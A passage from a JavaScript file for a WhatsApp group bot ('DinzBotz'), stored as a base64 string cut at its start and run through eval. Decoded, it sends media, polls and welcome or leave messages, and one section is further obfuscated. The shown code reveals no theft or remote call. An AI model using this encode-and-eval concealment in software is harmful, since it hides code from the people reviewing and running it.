0ge1N0cmluZ3xCdWZmZXJ9IHBhdGgKICAgICAgICAgICAgICogQHBhcmFtIHtTdHJpbmd9IGZpbGVuYW1lCiAgICAgICAgICAgICAqIEBwYXJhbSB7U3RyaW5nfSBjYXB0aW9uCiAgICAgICAgICAgICAqIEBwYXJhbSB7aW1wb3J0KCdAYWRpd2Fqc2hpbmcvYmFpbGV5cycpLnByb3RvLldlYk1lc3NhZ2VJbmZvfSBxdW90ZWQKICAgICAgICAgICAgICogQHBhcmFtIHtCb29sZWFufSBwdHQKICAgICAgICAgICAgICogQHBhcmFtIHtPYmplY3R9IG9wdGlvbnMKICAgICAgICAgICAgICovCkRpbnpCb3R6LnNlbmRGaWxlID0gYXN5bmMgKGppZCwgcGF0aCwgZmlsZW5hbWUgPSAnJywgY2FwdGlvbiA9ICcnLCBxdW90ZWQsIHB0dCA9IGZhbHNlLCBvcHRpb25zID0ge30pID0+IHsKICBsZXQgdHlwZSA9IGF3YWl0IERpbnpCb3R6LmdldEZpbGUocGF0aCwgdHJ1ZSk7CiAgbGV0IHsgcmVzLCBkYXRhOiBmaWxlLCBmaWxlbmFtZTogcGF0aEZpbGUgfSA9IHR5cGU7CgogIGlmIChyZXMgJiYgcmVzLnN0YXR1cyAhPT0gMjAwIHx8IGZpbGUubGVuZ3RoIDw9IDY1NTM2KSB7CiAgICB0cnkgewogICAgICB0aHJvdyB7CiAgICAgICAganNvbjogSlNPTi5wYXJzZShmaWxlLnRvU3RyaW5nKCkpCiAgICAgIH07CiAgICB9IGNhdGNoIChlKSB7CiAgICAgIGlmIChlLmpzb24pIHRocm93IGUuanNvbjsKICAgIH0KICB9CgogIGxldCBvcHQgPSB7CiAgICBmaWxlbmFtZQogIH07CgogIGlmIChxdW90ZWQpIG9wdC5xdW90ZWQgPSBxdW90ZWQ7CiAgaWYgKCF0eXBlKSBvcHRpb25zLmFzRG9jdW1lbnQgPSB0cnVlOwoKICBsZXQgbXR5cGUgPSAnJywKICAgIG1pbWV0eXBlID0gdHlwZS5taW1lLAogICAgY29udmVydDsKCiAgaWYgKC93ZWJwLy50ZXN0KHR5cGUubWltZSkgfHwgKC9pbWFnZS8udGVzdCh0eXBlLm1pbWUpICYmIG9wdGlvbnMuYXNTdGlja2VyKSkgbXR5cGUgPSAnc3RpY2tlcic7CiAgZWxzZSBpZiAoL2ltYWdlLy50ZXN0KHR5cGUubWltZSkgfHwgKC93ZWJwLy50ZXN0KHR5cGUubWltZSkgJiYgb3B0aW9ucy5hc0ltYWdlKSkgbXR5cGUgPSAnaW1hZ2UnOwogIGVsc2UgaWYgKC92aWRlby8udGVzdCh0eXBlLm1pbWUpKSBtdHlwZSA9ICd2aWRlbyc7CiAgZWxzZSBpZiAoL2F1ZGlvLy50ZXN0KHR5cGUubWltZSkpIHsKICAgIGNvbnZlcnQgPSBhd2FpdCAocHR0ID8gdG9QVFQgOiB0b0F1ZGlvKShmaWxlLCB0eXBlLmV4dCk7CiAgICBmaWxlID0gY29udmVydC5kYXRhOwogICAgcGF0aEZpbGUgPSBjb252ZXJ0LmZpbGVuYW1lOwogICAgbXR5cGUgPSAnYXVkaW8nOwogICAgbWltZXR5cGUgPSAnYXVkaW8vb2dnOyBjb2RlY3M9b3B1cyc7CiAgfSBlbHNlIG10eXBlID0gJ2RvY3VtZW50JzsKCiAgaWYgKG9wdGlvbnMuYXNEb2N1bWVudCkgbXR5cGUgPSAnZG9jdW1lbnQnOwoKICBkZWxldGUgb3B0aW9ucy5hc1N0aWNrZXI7CiAgZGVsZXRlIG9wdGlvbnMuYXNMb2NhdGlvbjsKICBkZWxldGUgb3B0aW9ucy5hc1ZpZGVvOwogIGRlbGV0ZSBvcHRpb25zLmFzRG9jdW1lbnQ7CiAgZGVsZXRlIG9wdGlvbnMuYXNJbWFnZTsKCiAgbGV0IG1lc3NhZ2UgPSB7IC4uLm9wdGlvbnMsIGNhcHRpb24sIHB0dCwgW210eXBlXTogeyB1cmw6IHBhdGhGaWxlIH0sIG1pbWV0eXBlIH07CiAgbGV0IG07CgogIHRyeSB7CiAgICBtID0gYXdhaXQgRGluekJvdHouc2VuZE1lc3NhZ2UoamlkLCBtZXNzYWdlLCB7IC4uLm9wdCwgLi4ub3B0aW9ucyB9KTsKICB9IGNhdGNoIChlKSB7CiAgICAvL2NvbnNvbGUuZXJyb3IoZSkKICAgIG0gPSBudWxsOwogIH0gZmluYWxseSB7CiAgICBpZiAoIW0pIG0gPSBhd2FpdCBEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgLi4ubWVzc2FnZSwgW210eXBlXTogZmlsZSB9LCB7IC4uLm9wdCwgLi4ub3B0aW9ucyB9KTsKICAgIGZpbGUgPSBudWxsOwogICAgcmV0dXJuIG07CiAgfQp9CgpEaW56Qm90ei5ldi5vbignZ3JvdXAtcGFydGljaXBhbnRzLnVwZGF0ZScsIGFzeW5jIChhbnUpID0+IHsKCmlmIChnbG9iYWwud2xjbSl7CmNvbnNvbGUubG9nKGFudSkKdHJ5IHsKbGV0IG1ldGFkYXRhID0gYXdhaXQgRGluekJvdHouZ3JvdXBNZXRhZGF0YShhbnUuaWQpCmxldCBwYXJ0aWNpcGFudHMgPSBhbnUucGFydGljaXBhbnRzCmxldCBuYW1hZ2MgPSBtZXRhZGF0YS5zdWJqZWN0CmxldCB0aHVtd2VsID0gYCR7Z2xvYmFsLndsY21pbWd9YApsZXQgdGh1bWxlZnQgPSBgJHtnbG9iYWwubGVmdGltZ31gCmxldCBqdW1wYWhNZW0gPSBtZXRhZGF0YS5wYXJ0aWNpcGFudHMubGVuZ3RoCmZvciAobGV0IG51bSBvZiBwYXJ0aWNpcGFudHMpIHsKCmZ1bmN0aW9uIF8weDJkZmUoKSB7CiAgICBjb25zdCBfMHgyN2UxYjEgPSBbCiAgICAgICAgJ2F1dGhvcicsCiAgICAgICAgJ2xlbmd0aCcsCiAgICAgICAgJzU2NjcxOFR4Q1dJSCcsCiAgICAgICAgJzc0Mjc4OE5CcVVHZicsCiAgICAgICAgJ3dlbGNvbWUuanMnLAogICAgICAgICdyZXBsYWNlJywKICAgICAgICAnNVNza3drSycsCiAgICAgICAgJ3JlYWRGaWxlU3knLAogICAgICAgICd1dGY4JywKICAgICAgICAnMjc3NDUyMGtsU2JmaCcsCiAgICAgICAgJzIxODgxMGxjSkRMbycsCiAgICAgICAgJ3RleHQnLAogICAgICAgICcjZ3J1cCcsCiAgICAgICAgJy4vbGlicmFyeS8nLAogICAgICAgICc3ZXdxV2dSJywKICAgICAgICAnMTQ5Mzk1NmFpWWlmZCcsCiAgICAgICAgJyN1c2VyJywKICAgICAgICAncGFyc2UnLAogICAgICAgICdzdWJqZWN0JywKICAgICAgICAnI2F1dGhvcicsCiAgICAgICAgJ3NwbGl0JywKICAgICAgICAnMTAwMk9CSHJUdCcsCiAgICAgICAgJzM1NGdjbmlXSScsCiAgICAgICAgJzQzMzMxNG15QXBIbCcsCiAgICAgICAgJyN0b3RhbCcsCiAgICAgICAgJ2xlZnQuanNvbicKICAgIF07CiAgICBfMHgyZGZlID0gZnVuY3Rpb24gKCkgewogICAgICAgIHJldHVybiBfMHgyN2UxYjE7CiAgICB9OwogICAgcmV0dXJuIF8weDJkZmUoKTsKfQpjb25zdCBfMHgxZTY0MDEgPSBfMHg0ZjI2OwooZnVuY3Rpb24gKF8weDEwNDMwNywgXzB4NTQyYmIxKSB7CiAgICBjb25zdCBfMHg0YmE3NGIgPSBfMHg0ZjI2LCBfMHg0M2NiMzMgPSBfMHgxMDQzMDcoKTsKICAgIHdoaWxlICghIVtdKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc3QgXzB4OGYzNjgzID0gLXBhcnNlSW50KF8weDRiYTc0YigweDFmNCkpIC8gKC0weDI1OTcgKyAweGM4MSAqIDB4MSArIC0weDE5MTcgKiAtMHgxKSArIC1wYXJzZUludChfMHg0YmE3NGIoMHgxZjMpKSAvICgtMHhkYTIgKyAweDI1NjEgKiAtMHgxICsgLTB4MTYxICogLTB4MjUpICogKHBhcnNlSW50KF8weDRiYTc0YigweDFmMikpIC8gKC0weDM1ICogLTB4MjMgKyAweDE3NSAqIDB4MiArIC0weGEyNikpICsgcGFyc2VJbnQoXzB4NGJhNzRiKDB4MWVjKSkgLyAoLTB4ODQ3ICsgLTB4ZTAxICsgMHgxNjRjKSAqIChwYXJzZUludChfMHg0YmE3NGIoMHgxZmQpKSAvICgweDFjNTcgKiAweDEgKyAweDIgKiAtMHhhMWYgKyAtMHg4MTQpKSArIHBhcnNlSW50KF8weDRiYTc0YigweDFmOSkpIC8gKC0weDEyN2MgKyAweDcgKiAtMHgxMDUgKyAweGQgKiAweDFmOSkgKiAocGFyc2VJbnQoXzB4NGJhNzRiKDB4MWViKSkgLyAoLTB4MTliZiArIDB4MyAqIC0weDUyYSArIDB4MTRhMiAqIDB4MikpICsgcGFyc2VJbnQoXzB4NGJhNzRiKDB4MjAwKSkgLyAoMHhlYiArIDB4MSAqIC0weDIwMGQgKyAweDFmMmEpICsgLXBhcnNlSW50KF8weDRiYTc0YigweDFmYSkpIC8gKC0weDEgKiAweDIyOTcgKyAtMHg0YiArIC0weDEgKiAtMHgyMmViKSArIC1wYXJzZUludChfMHg0YmE3NGIoMHgyMDEpKSAvICgtMHg2YTUgKyAtMHgyNjYgKiAweDEwICsgMHgyZDBmKTsKICAgICAgICAgICAgaWYgKF8weDhmMzY4MyA9PT0gXzB4NTQyYmIxKQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIF8weDQzY2IzM1sncHVzaCddKF8weDQzY2IzM1snc2hpZnQnXSgpKTsKICAgICAgICB9IGNhdGNoIChfMHgyNWNlNWQpIHsKICAgICAgICAgICAgXzB4NDNjYjMzWydwdXNoJ10oXzB4NDNjYjMzWydzaGlmdCddKCkpOwogICAgICAgIH0KICAgIH0KfShfMHgyZGZlLCAweDFiODY3ICsgLTB4NSAqIC0weDJjNzUgKyAtMHgzICogLTB4M2VkOCkpOwpmdW5jdGlvbiBfMHg0ZjI2KF8weDMzMmE4MywgXzB4MTkzYmE4KSB7CiAgICBjb25zdCBfMHgyNjJhNzEgPSBfMHgyZGZlKCk7CiAgICByZXR1cm4gXzB4NGYyNiA9IGZ1bmN0aW9uIChfMHgyODNjZjUsIF8weDIxM2VlZSkgewogICAgICAgIF8weDI4M2NmNSA9IF8weDI4M2NmNSAtICgweDE4MjMgKyAweDEgKiAtMHgyM2MyICsgLTB4ZiAqIC0weGU3KTsKICAgICAgICBsZXQgXzB4M2NmODE0ID0gXzB4MjYyYTcxW18weDI4M2NmNV07CiAgICAgICAgcmV0dXJuIF8weDNjZjgxNDsKICAgIH0sIF8weDRmMjYoXzB4MzMyYTgzLCBfMHgxOTNiYTgpOwp9CmxldCBkYXQgPSBhd2FpdCBmc1tfMHgxZTY0MDEoMHgxZmUpICsgJ25jJ10oXzB4MWU2NDAxKDB4MWVhKSArIF8weDFlNjQwMSgweDFmYikgKyAnb24nLCBfMHgxZTY0MDEoMHgxZmYpKSwgZGF0SnNvbiA9IEpTT05bXzB4MWU2NDAxKDB4MWVlKV0oZGF0KSwgd2VsY29tZVRleHQgPSBkYXRKc29uW18weDFlNjQwMSgweDIwMildW18weDFlNjQwMSgweDFmYyldKF8weDFlNjQwMSgweDFlZCksICdAJyArIG51bVtfMHgxZTY0MDEoMHgxZjEpXSgnQCcpWzB4NjFiICogLTB4MSArIDB4ZTkgKiAtMHhkICsgMHgxMWYwXSlbXzB4MWU2NDAxKDB4MWZjKV0oXzB4MWU2NDAxKDB4MjAzKSwgbWV0YWRhdGFbXzB4MWU2NDAxKDB4MWVmKV0pW18weDFlNjQwMSgweDFmYyldKF8weDFlNjQwMSgweDFmNSksIHBhcnRpY2lwYW50c1tfMHgxZTY0MDEoMHgxZjgpXSlbXzB4MWU2NDAxKDB4MWZjKV0oXzB4MWU2NDAxKDB4MWYwKSwgJ0AnICsgYW51W18weDFlNjQwMSgweDFmNyldW18weDFlNjQwMSgweDFmMSldKCdAJylbLTB4MTVmOSArIDB4MSAqIC0weDFlYWQgKyAweDM0YTZdKSwgZGF0cyA9IGF3YWl0IGZzW18weDFlNjQwMSgweDFmZSkgKyAnbmMnXShfMHgxZTY0MDEoMHgxZWEpICsgXzB4MWU2NDAxKDB4MWY2KSwgXzB4MWU2NDAxKDB4MWZmKSksIGxlZnRKc29uID0gSlNPTltfMHgxZTY0MDEoMHgxZWUpXShkYXRzKSwgbGVmdFRleHQgPSBsZWZ0SnNvbltfMHgxZTY0MDEoMHgyMDIpXVtfMHgxZTY0MDEoMHgxZmMpXShfMHgxZTY0MDEoMHgxZWQpLCAnQCcgKyBudW1bXzB4MWU2NDAxKDB4MWYxKV0oJ0AnKVsweDE0Y2IgKiAtMHgxICsgLTB4NjBkICogMHgyICsgMHgyMGU1XSlbXzB4MWU2NDAxKDB4MWZjKV0oXzB4MWU2NDAxKDB4MjAzKSwgbWV0YWRhdGFbXzB4MWU2NDAxKDB4MWVmKV0pW18weDFlNjQwMSgweDFmYyldKF8weDFlNjQwMSgweDFmNSksIHBhcnRpY2lwYW50c1tfMHgxZTY0MDEoMHgxZjgpXSlbXzB4MWU2NDAxKDB4MWZjKV0oXzB4MWU2NDAxKDB4MWYwKSwgJ0AnICsgYW51W18weDFlNjQwMSgweDFmNyldW18weDFlNjQwMSgweDFmMSldKCdAJylbLTB4MiAqIDB4YjUzICsgMHhhZmIgKyAweGJhYl0pOwogIApsZXQgY2hlY2sgPSBhbnUuYXV0aG9yICE9PSBudW0gJiYgYW51LmF1dGhvci5sZW5ndGggPiAxOwpsZXQgdGFnID0gY2hlY2sgPyBbYW51LmF1dGhvciwgbnVtXSA6IFtudW1dOwogIAp0cnkgewpwcHVzZXIgPSBhd2FpdCBEaW56Qm90ei5wcm9maWxlUGljdHVyZVVybChudW0sICdpbWFnZScpCn0gY2F0Y2ggKGVycikgewpwcHVzZXIgPSAnaHR0cHM6Ly9jZG4ucGl4YWJheS5jb20vcGhvdG8vMjAxNS8xMC8wNS8yMi8zNy9ibGFuay1wcm9maWxlLXBpY3R1cmUtOTczNDYwXzk2MF83MjAucG5nP3E9NjAnCn0KdHJ5IHsKcHBncm91cCA9IGF3YWl0IERpbnpCb3R6LnByb2ZpbGVQaWN0dXJlVXJsKGFudS5pZCwgJ2ltYWdlJykKfSBjYXRjaCAoZXJyKSB7CnBwZ3JvdXAgPSAnaHR0cHM6Ly9pLmliYi5jby9SQng1U1FDL2F2YXRhci1ncm91cC1sYXJnZS12Mi5wbmc/cT02MCcKfQptZW1iID0gbWV0YWRhdGEucGFydGljaXBhbnRzLmxlbmd0aApJbWFnZVdsY20gPSBhd2FpdCBnZXRCdWZmZXIocHB1c2VyKQpJbWFnZUxlZnQgPSBhd2FpdCBnZXRCdWZmZXIocHB1c2VyKQogaWYgKGFudS5hY3Rpb24gPT0gJ2FkZCcpIHsKICBjb25zdCBjYW5XZWwgPSBhd2FpdCBuZXcgY2FudmFmeS5XZWxjb21lTGVhdmUoKQogICAgLnNldEF2YXRhcihJbWFnZVdsY20pCiAgICAuc2V0QmFja2dyb3VuZCgiaW1hZ2UiLCBgJHtnbG9iYWwud2xjbWltZ31gKQogICAgLnNldFRpdGxlKCJXZWxjb21lIikKICAgIC5zZXREZXNjcmlwdGlvbihgc2VsYW1hdCBkYXRhbmcga2FrYCkKICAgIC5zZXRCb3JkZXIoIiMyYTJlMzUiKQogICAgLnNldEF2YXRhckJvcmRlcigiIzJhMmUzNSIpCiAgICAuc2V0T3ZlcmxheU9wYWNpdHkoMC41KQogICAgLmJ1aWxkKCk7CmxldCB4bnh4ID0gY2FuV2VsCmNvbnN0IHhtZW1iZXJzID0gbWV0YWRhdGEucGFydGljaXBhbnRzLmxlbmd0aAoKRGluekJvdHouc2VuZE1lc3NhZ2UoYW51LmlkLAogeyB0ZXh0OiB3ZWxjb21lVGV4dCB8fCBgSGlpIEAke251bS5zcGxpdCgiQCIpWzBdffCfkYtcbldlbGNvbWUgdG8gJHttZXRhZGF0YS5zdWJqZWN0fQoKJHtnbG9iYWwudGV4dHdsY219YAosCiBjb250ZXh0SW5mbzp7CiBtZW50aW9uZWRKaWQ6W251bV0sCiAgICAgIGV4dGVybmFsQWRSZXBseTogewogICAgICAgICAgICAgICAgdGl0bGU6ICdXIEUgTCBDIE8gTSBFJywKICAgICAgICAgICAgICAgIGJvZHk6ICdEaW56SUQgQ2h4JywKICAgICAgICAgICAgICAgIHRodW1ibmFpbDogeG54eCwKICAgICAgICAgICAgICAgIHNvdXJjZVVybDogJycsCiAgICAgICAgICAgICAgICBtZWRpYVR5cGU6IDEsCiAgICAgICAgICAgICAgICByZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUKICAgICAgICAgICB9CiAgICAgICB9CiAgIH0KKSAgICAgICAgICAgICAgICAKIH0gZWxzZSBpZiAoYW51LmFjdGlvbiA9PSAncmVtb3ZlJykgewogICBjb25zdCBjYW5XZWwgPSBhd2FpdCBuZXcgY2FudmFmeS5XZWxjb21lTGVhdmUoKQogICAgLnNldEF2YXRhcihJbWFnZUxlZnQpCiAgICAuc2V0QmFja2dyb3VuZCgiaW1hZ2UiLCAgYCR7Z2xvYmFsLmxlZnRpbWd9YCkKICAgIC5zZXRUaXRsZSgiR29vZGJ5ZSIpCiAgICAuc2V0RGVzY3JpcHRpb24oYEJ5ZSBNZW1iZXIgS2UtJHtqdW1wYWhNZW19YCkKICAgIC5zZXRCb3JkZXIoIiMyYTJlMzUiKQogICAgLnNldEF2YXRhckJvcmRlcigiIzJhMmUzNSIpCiAgICAuc2V0T3ZlcmxheU9wYWNpdHkoMC41KQogICAgLmJ1aWxkKCk7CmxldCBwb3JuaHViID0gY2FuV2VsCiAKRGluekJvdHouc2VuZE1lc3NhZ2UoYW51LmlkLAogeyB0ZXh0OiBsZWZ0VGV4dCB8fCBgU2F5b25hcmEgQCR7bnVtLnNwbGl0KCJAIilbMF19IPCfkYtgLAogY29udGV4dEluZm86ewogbWVudGlvbmVkSmlkOltudW1dLAogICAgICBleHRlcm5hbEFkUmVwbHk6IHsKICAgICAgICAgICAgICAgIHRpdGxlOiAnRyBPIE8gRCBCIFkgRScsCiAgICAgICAgICAgICAgICBib2R5OiAnRGlueklEIENoeCcsCiAgICAgICAgICAgICAgICB0aHVtYm5haWw6IHBvcm5odWIsCiAgICAgICAgICAgICAgICBzb3VyY2VVcmw6ICcnLAogICAgICAgICAgICAgICAgbWVkaWFUeXBlOiAxLAogICAgICAgICAgICAgICAgcmVuZGVyTGFyZ2VyVGh1bWJuYWlsOiB0cnVlCiAgICAgICAgICAgfQogICAgICAgfQogICB9CikgICAgICAgICAgICAgICAgCn0gZWxzZSBpZiAoYW51LmFjdGlvbiA9PSAicHJvbW90ZSIpIHsKICAgICAgICAgICAgICAgICAgICAgRGluekJvdHouc2VuZE1lc3NhZ2UoYW51LmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICB0ZXh0OiBgQCR7YW51LmF1dGhvci5zcGxpdCgiQCIpWzBdfSBoYXMgbWFkZSBAJHtudW0uc3BsaXQoIkAiKVswXX0gYXMgYWRtaW4gb2YgdGhpcyBncm91cGAsIAogICAgICAgICAgICAgICAgICAgICAgICAgY29udGV4dEluZm86IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW50aW9uZWRKaWQ6IFsuLi50YWddLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dGVybmFsQWRSZXBseTogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHVtYm5haWxVcmw6ICJodHRwczovL3BvbWYyLmxhaW4ubGEvZi9pYml1MnRkNS5qcGciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ8KpIFByb21vdGUgTWVzc2FnZScsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBib2R5OiAnJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVuZGVyTGFyZ2VyVGh1bWJuYWlsOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzb3VyY2VVcmw6ICdodHRwczovL29wZW4uc3BvdGlmeS5jb20vdHJhY2svMERrajg4Y1BRVFMxMjVzd25NeElmTD9zaT1xcmZGNlVpLVJoeTRMUVZZM2R5QUtBJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVkaWFUeXBlOiAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgfSBlbHNlIGlmIChhbnUuYWN0aW9uID09ICJkZW1vdGUiKSB7CiAgICAgICAgICAgICAgICAgICAgRGluekJvdHouc2VuZE1lc3NhZ2UoYW51LmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRleHQ6IGBAJHthbnUuYXV0aG9yLnNwbGl0KCJAIilbMF19IGhhcyByZW1vdmVkIEAke251bS5zcGxpdCgiQCIpWzBdfSBhcyBhZG1pbiBvZiB0aGlzIGdyb3VwYCwgCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRleHRJbmZvOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW50aW9uZWRKaWQ6IFsuLi50YWddLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0ZXJuYWxBZFJlcGx5OiB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRodW1ibmFpbFVybDogImh0dHBzOi8vcG9tZjIubGFpbi5sYS9mL3BhcHo5dGF0LmpwZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICfCqSBEZW1vdGUgTWVzc2FnZScsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJvZHk6ICcnLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZW5kZXJMYXJnZXJUaHVtYm5haWw6IHRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc291cmNlVXJsOiAnaHR0cHMvL1dhLm1lJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZWRpYVR5cGU6IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pCiAgfQogICAgICAgICAgICAgICAgfQp9IGNhdGNoIChlcnIpIHsKY29uc29sZS5sb2coZXJyKQp9Cn0KfSkKCkRpbnpCb3R6LnNlbmRGaWxlVXJsID0gYXN5bmMgKGppZCwgdXJsLCBjYXB0aW9uLCBxdW90ZWQsIG9wdGlvbnMgPSB7fSkgPT4gewogICAgICBsZXQgbWltZSA9ICcnOwogICAgICBsZXQgcmVzID0gYXdhaXQgYXhpb3MuaGVhZCh1cmwpCiAgICAgIG1pbWUgPSByZXMuaGVhZGVyc1snY29udGVudC10eXBlJ10KICAgICAgaWYgKG1pbWUuc3BsaXQoIi8iKVsxXSA9PT0gImdpZiIpIHsKICAgICByZXR1cm4gRGluekJvdHouc2VuZE1lc3NhZ2UoamlkLCB7IHZpZGVvOiBhd2FpdCBnZXRCdWZmZXIodXJsKSwgY2FwdGlvbjogY2FwdGlvbiwgZ2lmUGxheWJhY2s6IHRydWUsIC4uLm9wdGlvbnN9LCB7IHF1b3RlZDogcXVvdGVkLCAuLi5vcHRpb25zfSkKICAgICAgfQogICAgICBsZXQgdHlwZSA9IG1pbWUuc3BsaXQoIi8iKVswXSsiTWVzc2FnZSIKICAgICAgaWYobWltZSA9PT0gImFwcGxpY2F0aW9uL3BkZiIpewogICAgIHJldHVybiBEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgZG9jdW1lbnQ6IGF3YWl0IGdldEJ1ZmZlcih1cmwpLCBtaW1ldHlwZTogJ2FwcGxpY2F0aW9uL3BkZicsIGNhcHRpb246IGNhcHRpb24sIC4uLm9wdGlvbnN9LCB7IHF1b3RlZDogcXVvdGVkLCAuLi5vcHRpb25zIH0pCiAgICAgIH0KICAgICAgaWYobWltZS5zcGxpdCgiLyIpWzBdID09PSAiaW1hZ2UiKXsKICAgICByZXR1cm4gRGluekJvdHouc2VuZE1lc3NhZ2UoamlkLCB7IGltYWdlOiBhd2FpdCBnZXRCdWZmZXIodXJsKSwgY2FwdGlvbjogY2FwdGlvbiwgLi4ub3B0aW9uc30sIHsgcXVvdGVkOiBxdW90ZWQsIC4uLm9wdGlvbnN9KQogICAgICB9CiAgICAgIGlmKG1pbWUuc3BsaXQoIi8iKVswXSA9PT0gInZpZGVvIil7CiAgICAgcmV0dXJuIERpbnpCb3R6LnNlbmRNZXNzYWdlKGppZCwgeyB2aWRlbzogYXdhaXQgZ2V0QnVmZmVyKHVybCksIGNhcHRpb246IGNhcHRpb24sIG1pbWV0eXBlOiAndmlkZW8vbXA0JywgLi4ub3B0aW9uc30sIHsgcXVvdGVkOiBxdW90ZWQsIC4uLm9wdGlvbnMgfSkKICAgICAgfQogICAgICBpZihtaW1lLnNwbGl0KCIvIilbMF0gPT09ICJhdWRpbyIpewogICAgIHJldHVybiBEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgYXVkaW86IGF3YWl0IGdldEJ1ZmZlcih1cmwpLCBjYXB0aW9uOiBjYXB0aW9uLCBtaW1ldHlwZTogJ2F1ZGlvL21wZWcnLCAuLi5vcHRpb25zfSwgeyBxdW90ZWQ6IHF1b3RlZCwgLi4ub3B0aW9ucyB9KQogICAgICB9CiAgICAgIH0KICAgICAgCiAgICAgIC8qKgogICAgICogCiAgICAgKiBAcGFyYW0geyp9IGppZCAKICAgICAqIEBwYXJhbSB7Kn0gbmFtZSAKICAgICAqIEBwYXJhbSBbKl0gdmFsdWVzIAogICAgICogQHJldHVybnMgCiAgICAgKi8KICAgIERpbnpCb3R6LnNlbmRQb2xsID0gKGppZCwgbmFtZSA9ICcnLCB2YWx1ZXMgPSBbXSwgc2VsZWN0YWJsZUNvdW50ID0gMSkgPT4geyByZXR1cm4gRGluekJvdHouc2VuZE1lc3NhZ2UoamlkLCB7IHBvbGw6IHsgbmFtZSwgdmFsdWVzLCBzZWxlY3RhYmxlQ291bnQgfX0pIH0KCnJldHVybiBEaW56Qm90egoKfQoKRGluekJvdHpJbmQoKQoKcHJvY2Vzcy5vbigndW5jYXVnaHRFeGNlcHRpb24nLCBmdW5jdGlvbiAoZXJyKSB7CmNvbnNvbGUubG9nKCdDYXVnaHQgZXhjZXB0aW9uOiAnLCBlcnIpCn0pCg==')))")();
  eval(decode);
})();